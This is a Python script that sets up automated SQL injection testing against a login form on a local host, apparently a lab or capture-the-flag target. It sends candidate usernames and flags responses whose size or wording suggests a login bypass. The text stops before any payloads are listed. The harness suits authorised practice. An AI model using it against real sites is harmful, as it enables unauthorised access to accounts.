import requests
import urllib.parse
import itertools

# Target URL
url = "http://127.0.0.1:32989/index.php"

# Baseline "fail" response size
FAIL_SIZE = 3178

# Session for cookie persistence
session = requests.Session()

def test_payload(payload_desc, username, password="test"):
    """Test a single payload and return results"""
    try:
        data = {
            'username': username,
            'password': password
        }
        response = session.post(url, data=data, timeout=10)
        size = len(response.content)
        status = response.status_code
        
        # Check for success indicators
        content = response.text.lower()
        success_indicators = ['welcome', 'dashboard', 'admin', 'logged in', 'success', 'logout', 'profile']
        found_indicators = [ind for ind in success_indicators if ind in content]
        
        is_different = size != FAIL_SIZE or found_indicators
        
        return {
            'desc': payload_desc,
            'username': username,
            'size': size,
            'status': status,
            'indicators': found_indicators,
            'is_different': is_different,
            'content_snippet': response.text[:300] if is_different else None
        }
    except Exception as e:
        return {
            'desc': payload_desc,
            'username': username,
            'error': str(e),
            'is_different': False
        }

def print_result(r):
    """Print test result"""
    if 'error' in r:
        print(f"[ERROR] {r['desc']}: {r['error']}")
    elif r['is_different']:
        print(f"\n[!] ANOMALY DETECTED: {r['desc']}")
        print(f"    Payload: {repr(r['username'])}")
        print(f"    Size: {r['size']} bytes (expected {FAIL_SIZE})")
        print(f"    Status: {r['status']}")
        if r['indicators']:
            print(f"    Indicators found: {r['indicators']}")
        if r['content_snippet']:
            print(f"    Content: {r['content_snippet'][:500]}")
        return True
    else:
        print(f"[FAIL] {r['desc']}: {r['size']} bytes (same)")
    return False

# Track results
anomalies = []
print(f"[*] Testing SQLi mutations on {url}")
print(f"[*] Baseline fail size: {FAIL_SIZE} bytes")
print("="*70)

